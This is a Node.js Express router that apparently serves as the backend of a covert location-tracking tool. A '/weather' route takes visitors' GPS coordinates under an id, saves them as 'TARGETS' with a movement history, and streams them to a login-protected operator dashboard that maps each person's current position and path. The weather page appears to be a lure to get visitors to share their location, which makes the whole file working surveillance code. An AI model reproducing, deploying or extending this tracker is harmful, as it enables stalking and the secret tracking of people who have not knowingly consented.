const express = require("express")
const router = express.Router()
const config = require("./config")
const fs = require("fs")
const path = require("path")

const DATA_FILE = path.join(__dirname, "data.json")
const MAX_HISTORY = 500  // max GPS points stored per user

let TARGETS = {}

// Load saved TARGETS from file on startup, handle both old and new format
try {
    if (fs.existsSync(DATA_FILE)) {
        const raw = fs.readFileSync(DATA_FILE, "utf-8")
        const saved = JSON.parse(raw)
        for (const [id, val] of Object.entries(saved)) {
            // Migrate old format [lat, lng] → new format { current, history }
            if (Array.isArray(val)) {
                TARGETS[id] = { current: val, history: [val] }
            } else {
                TARGETS[id] = val
            }
        }
        console.log(`> Loaded ${Object.keys(TARGETS).length} saved target(s) from data.json`)
    }
} catch (err) {
    console.warn("> Could not load data.json, starting fresh:", err.message)
}

function saveTargets() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(TARGETS, null, 2), "utf-8")
    } catch (err) {
        console.error("> Failed to save data.json:", err.message)
    }
}

// login page
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body
    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }
    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    const isNew = TARGETS[id] == null

    if (isNew) {
        TARGETS[id] = { current: [lat, lng], history: [] }
        IO.emit("user-connected", id)
    }

    const lastPoint = TARGETS[id].history.length > 0 ? TARGETS[id].history[TARGETS[id].history.length - 1] : null;
    TARGETS[id].current = [lat, lng];
    
    // Only add to history if the location actually changed
    if (!lastPoint || lastPoint[0] !== lat || lastPoint[1] !== lng) {
        TARGETS[id].history.push([lat, lng]);
        
        // Cap history to avoid huge files
        if (TARGETS[id].history.length > MAX_HISTORY) {
            TARGETS[id].history.shift()
        }
    }

    IO.emit("map-data", { id, lat, lng })
    saveTargets()
    res.send("OK")
    console.log(`> ${id} - ${lat},${lng}`)
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    // Build simplified { id: [lat, lng] } for the overview map in home.html
    const targetsForMap = {}
    for (const [id, val] of Object.entries(TARGETS)) {
        targetsForMap[id] = val.current || val
    }
    res.render("home", {
        TARGETS,
        targetsMapJson: JSON.stringify(targetsForMap)
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    const target = TARGETS[id]
    res.render("map", {
        data: target ? target.current : [0, 0],
        historyJson: JSON.stringify(target ? target.history : [])
    })
})

module.exports = router